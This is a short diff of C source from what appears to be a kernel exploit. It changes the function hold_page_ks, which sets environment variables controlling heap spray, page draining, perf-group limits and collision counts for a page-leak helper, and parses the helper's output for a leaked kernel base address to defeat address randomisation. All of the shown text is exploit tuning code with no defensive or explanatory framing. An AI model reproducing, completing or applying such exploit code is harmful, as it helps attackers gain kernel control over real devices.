@@ -1511,8 +1511,8 @@ static _Noreturn void hold_page_ks(uint64_t slide)
     envs[env_count++] = "PAGE_LEAK_AUTO_GO=1";
     envs[env_count++] = "PAGE_LEAK_FREE_ONLY=1";
     envs[env_count++] = "PAGE_LEAK_HOLD_SEC=120";
-    envs[env_count++] = "KSNITCH_COLLISIONS=8";
     if (skb_calibrate) {
+        envs[env_count++] = "KSNITCH_COLLISIONS=8";
         envs[env_count++] = "PAGE_LEAK_CALIBRATE=1";
         envs[env_count++] = "PAGE_LEAK_PERF_LATE=1";
         envs[env_count++] = "PAGE_LEAK_PERF_DEFER_STOP=1";
@@ -1559,7 +1559,9 @@ static _Noreturn void hold_page_ks(uint64_t slide)
         envs[env_count++] = "PAGE_LEAK_DEFER_SPRAY_CLOSE=1";
         envs[env_count++] = "PAGE_LEAK_DRAIN_SPRAY_STRIDE=1";
         envs[env_count++] = "PAGE_LEAK_NO_PERF_GROUP_TARGET=1";
-        envs[env_count++] = "PAGE_LEAK_NO_PERF_GROUP_MAX=150";
+        envs[env_count++] = "PAGE_LEAK_NO_PERF_GROUP_MAX=256";
+        envs[env_count++] = "PAGE_LEAK_NO_PERF_FAST_SKIP_DMA32=1";
+        envs[env_count++] = "PAGE_LEAK_NO_PERF_DMA32_SKIP_SLABS=8";
         envs[env_count++] = "PAGE_LEAK_NO_PERF_FAST_KS=1";
         envs[env_count++] = "PAGE_LEAK_NO_PERF_TARGET_WAIT_MS=1000";
         envs[env_count++] = "PAGE_LEAK_NO_PERF_TRIGGER_PAGES=14";
@@ -1573,6 +1575,7 @@ static _Noreturn void hold_page_ks(uint64_t slide)
             die("ks fops slide env");
         envs[env_count++] = fops_slide_env;
     } else {
+        envs[env_count++] = "KSNITCH_COLLISIONS=8";
         envs[env_count++] = "PAGE_LEAK_NO_PERF=1";
         envs[env_count++] = "PAGE_LEAK_DRAIN_PREP=1";
         if (getenv("A536_KS_KEEP_PREP")) {
@@ -1609,7 +1612,7 @@ static _Noreturn void hold_page_ks(uint64_t slide)
         while (fgets(line, sizeof(line), stream)) {
             printf("ks: %s", line);
             fflush(stdout);
-            if (sscanf(line, "PAGE_LEAK_FREE_OK mm=%*llx base=%llx",
+            if (sscanf(line, "PAGE_LEAK_TARGET_READY initial_mm=%*llx selected_base=%llx",
                        &ks_base) == 1)
                 break;
             if (!strncmp(line, "PAGE_LEAK_MM_FAIL", 17) ||
